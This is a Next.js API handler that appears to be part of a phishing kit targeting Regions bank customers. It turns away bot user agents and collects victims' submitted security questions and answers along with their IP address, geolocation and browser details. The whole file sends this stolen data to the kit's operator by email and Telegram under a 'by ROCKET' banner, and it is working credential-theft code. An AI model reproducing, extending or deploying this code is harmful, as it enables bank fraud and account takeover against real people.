import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendEmail } from "../../utils/sendEmail";
import { sendTelegram } from "../../utils/sendTelegram";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.end(`Fuck off`);
    return;
  }

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    const values = req.body;
    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
${
  values.form[0] === `SECURITY QUESTIONS` &&
  ` <br>
<h4>SECURITY QUESTIONS</h4>
<p>| (▰˘◡˘▰) QUESTIONS 1 ☞ <b>${
    JSON.parse(values.securityQuestions[0]).quest1
  }</b></p>
<p>| (▰˘◡˘▰) ANSWER 1 ☞ <b>${
    JSON.parse(values.securityQuestions[0]).ans1
  }</b></p>
<br>
<p>| (▰˘◡˘▰) QUESTIONS 2 ☞ <b>${
    JSON.parse(values.securityQuestions[0]).quest2
  }</b></p>
<p>| (▰˘◡˘▰) ANSWER 2 ☞ <b>${
    JSON.parse(values.securityQuestions[0]).ans2
  }</b></p>
<br>
<p>| (▰˘◡˘▰) QUESTIONS 3 ☞ <b>${
    JSON.parse(values.securityQuestions[0]).quest3
  }</b></p>
<p>| (▰˘◡˘▰) ANSWER 3 ☞ <b>${
    JSON.parse(values.securityQuestions[0]).ans3
  }</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>`
}`;

    if (process.env.TO) {
      await sendEmail(
        message,
        `REGIONS - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
REGIONS - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
${message}
`,
      });
    }
    res.send(Promise.resolve());
  } catch (error) {
    res.status(500).send({
      name: `Something went wrong`,
    });
  }
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
